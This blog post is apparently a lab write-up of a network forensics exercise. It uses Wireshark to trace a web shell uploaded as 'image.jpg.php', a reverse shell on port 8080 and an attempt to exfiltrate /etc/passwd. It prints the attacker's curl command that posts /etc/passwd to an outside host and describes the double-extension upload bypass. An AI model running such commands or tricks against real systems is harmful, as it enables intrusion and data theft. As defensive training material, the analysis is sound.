---
layout: post
title: "Webstrike"
author: Alex Maina Weru
date: 2025-12-29
categories: [Lab and CTF challenges, Network Forensic]
tags: [soc, cyberdefender, labs]

---

# WEBSTRIKE LAB – Network Forensics Analysis Using Wireshark

## Category
**Network Forensics**

## Tool Used
**Wireshark**

## MITRE ATT&CK Tactics Observed
- Initial Access  
- Execution  
- Persistence  
- Command and Control (C2)  
- Exfiltration  

---

## 1. Scenario Overview

A suspicious file was discovered on a company web server by the Development team, raising concerns of a possible compromise. The Network team captured network traffic in a PCAP file for forensic analysis.

The objective of this lab is to:
- Determine how the malicious file was uploaded
- Identify attacker infrastructure and behavior
- Confirm command-and-control activity
- Detect data exfiltration attempts

All analysis was conducted **offline** using Wireshark.

---

## 2. Question 1: Attacker Geographical Origin

### Objective
Identify the geographic origin of the attacker to support threat intelligence analysis and geo-blocking decisions.

### Methodology
1. Open the PCAP file in Wireshark.
2. Navigate to: Statistics → Endpoints → IPv4
3. Sort by **Packets** or **Bytes** to identify external IPs communicating heavily with the web server.
4. Identify the suspicious source IP:
- **Attacker IP:** `117.11.88.124`
- **Victim Server IP:** `24.49.63.79`


![](/assets/web/web1.png)


5. Use an external IP geolocation service (outside the lab environment) to locate the source IP.

### Findings
Using `ipgeolocation.io`, the IP address `117.11.88.124` was traced to:

- **City:** Tianjin  
- **Country:** China  

![](/assets/web/web2.png)

### Conclusion
The attack originated from **Tianjin City**, enabling defenders to consider geo-blocking and correlate this activity with known threat intelligence.

---

## 3. Question 2: Attacker User-Agent

### Objective
Identify the attacker’s User-Agent string to support detection and filtering rules.

### Methodology
1. Apply the Wireshark display filter: http.request.method == GET
2. Select an HTTP GET request originating from the attacker.
3. Expand: Hypertext Transfer Protocol → User-Agent

![](/assets/web/web3.png)


### Findings
The attacker used the following User-Agent: 
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

### Conclusion
This User-Agent indicates a **Linux-based system using Firefox**, which can be leveraged in SIEM detection rules and web server filtering.

---

## 4. Question 3: Malicious Web Shell Identification

### Objective
Determine whether a vulnerability was exploited and identify the malicious web shell.

### Methodology
1. Apply the filter: http.request.method == POST
2. Inspect POST requests associated with file uploads.
3. Right-click a POST packet and select: Follow → HTTP Stream
4. Examine server responses and uploaded filenames.

### Findings
- **First upload attempt:**  
- Rejected due to *Invalid file format* error.

![](/assets/web/web4.png)

  
- **Second upload attempt:**  
- Filename modified to bypass validation:
 ```
 image.jpg.php
 ```
- Server response confirmed:
 ```
 File uploaded successfully
 ```

![](/assets/web/web5.png)


### Conclusion
The attacker successfully uploaded a malicious web shell named:

**`image.jpg.php`**

This demonstrates exploitation of **improper file validation**, allowing execution of server-side PHP code.

---

## 5. Question 4: Upload Directory Identification

### Objective
Identify where uploaded files are stored on the server to assist remediation.

### Methodology
- Inspect HTTP POST requests associated with the successful upload.
- Review paths referenced in HTTP responses and execution requests.

  ![](/assets/web/web6.png)

  

### Findings
Uploaded files were stored in the directory:
/reviews/uploads/


### Conclusion
The `/reviews/uploads/` directory is the vulnerable location that must be audited and cleaned.

---

## 6. Question 5: Reverse Shell Target Port

### Objective
Identify the port used by the attacker for outbound communication via the web shell.

### Methodology
1. Follow the HTTP POST stream containing the uploaded web shell.
2. Analyze the embedded malicious code.
3. Inspect outbound connections initiated by the server.


![](/assets/web/web7.png)


### Findings
The malicious web shell attempted to establish a reverse connection to the attacker on:
Port 8080


### Conclusion
Port **8080** was used for unauthorized outbound communication, commonly chosen to evade basic firewall restrictions.

---

## 7. Question 6: Data Exfiltration Target

### Objective
Determine what data the attacker attempted to exfiltrate.

### Methodology
1. Apply the filter: (tcp.port == 8080) && (ip.src == 24.49.63.79)
2. Follow the TCP stream related to outbound traffic.
3. Inspect command execution within the reverse shell session.


![](/assets/web/web8.png)



### Findings
The attacker executed the following command:
curl -X POST -d /etc/passwd http://117.11.88.124:443/


### Conclusion
The attacker attempted to exfiltrate the:

**`/etc/passwd`** file

Although it does not contain password hashes, it provides valuable user and system information useful for reconnaissance and privilege escalation.

---

## 8. Overall Attack Chain Summary

1. External attacker connects to the web server
2. Attempts malicious file upload via HTTP POST
3. Bypasses file validation using double extension
4. Uploads and executes a PHP web shell
5. Establishes reverse shell on port 8080
6. Attempts data exfiltration of `/etc/passwd`

---

## 9. Lessons Learned

### 1. File Upload Validation Is Critical
Improper validation allowed execution of a malicious PHP file disguised as an image. Servers must:
- Enforce strict MIME type checks
- Block double extensions
- Store uploads outside executable directories

### 2. Network Traffic Reveals the Full Attack Story
Wireshark analysis exposed:
- Initial access
- Payload delivery
- Command-and-control
- Exfiltration attempts  
Network forensics is essential even when host logs are incomplete.

### 3. User-Agent and Ports Aid Detection
Unusual User-Agents and outbound traffic on ports like **8080** should trigger alerts in IDS/IPS and SIEM platforms.

### 4. Outbound Traffic Must Be Monitored
The reverse shell and exfiltration succeeded due to unrestricted outbound connections. Egress filtering could have blocked the attack.

### 5. Sensitive Files Are Prime Targets
Files such as `/etc/passwd` are often targeted for reconnaissance. Their access should be tightly controlled and monitored.

---

## 10. Final Remarks

This lab demonstrates how a seemingly small misconfiguration can lead to full server compromise. Through systematic Wireshark analysis, the attacker’s origin, tools, techniques, and objectives were successfully identified, reinforcing the importance of **defense-in-depth and continuous monitoring**.





